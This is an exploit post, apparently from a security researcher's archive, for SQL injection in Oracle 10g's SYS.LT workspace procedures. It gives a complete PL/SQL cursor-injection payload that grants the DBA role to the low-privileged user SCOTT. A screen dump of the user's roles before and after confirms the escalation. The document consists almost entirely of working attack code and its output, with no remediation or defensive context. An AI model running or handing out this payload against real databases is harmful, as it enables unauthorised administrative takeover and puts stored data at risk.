Oracle 10g SYS.LT.COMPRESSWORKSPACETREE SQL Injection Exploit
=============================================================


This is based on cursor injection and does not need create function privileges:

DECLARE
D NUMBER;
BEGIN
D := DBMS_SQL.OPEN_CURSOR;
DBMS_SQL.PARSE(D,&#039;declare pragma autonomous_transaction; begin execute immediate &#039;&#039;grant dba to scott&#039;&#039;;commit;end;&#039;,0);
SYS.LT.CREATEWORKSPACE(&#039;a&#039;&#039;and dbms_sql.execute(&#039;||D||&#039;)=1--&#039;);
SYS.LT.COMPRESSWORKSPACETREE(&#039;a&#039;&#039;and dbms_sql.execute(&#039;||D||&#039;)=1--&#039;);
end;

#-----------screen dump---------------------------------------------------#
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          EXECUTE_CATALOG_ROLE           NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO

SQL> DECLARE
  2  D NUMBER;
  3  BEGIN
  4  D := DBMS_SQL.OPEN_CURSOR;
  5  DBMS_SQL.PARSE(D,&#039;declare pragma autonomous_transaction; begin execute imme
diate &#039;&#039;grant dba to scott&#039;&#039;;commit;end;&#039;,0);
  6  SYS.LT.CREATEWORKSPACE(&#039;a&#039;&#039;and dbms_sql.execute(&#039;||D||&#039;)=1--&#039;);
  7  SYS.LT.COMPRESSWORKSPACETREE(&#039;a&#039;&#039;and dbms_sql.execute(&#039;||D||&#039;)=1--&#039;);
  8  end;
  9
 10
 11  /
DECLARE
*
ERROR at line 1:
ORA-01403: no data found
ORA-06512: at "SYS.LT", line 6118
ORA-06512: at "SYS.LT", line 6087
ORA-06512: at line 7


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          DBA                            NO  YES NO
SCOTT                          EXECUTE_CATALOG_ROLE           NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO


Sid
www.notsosecure.com



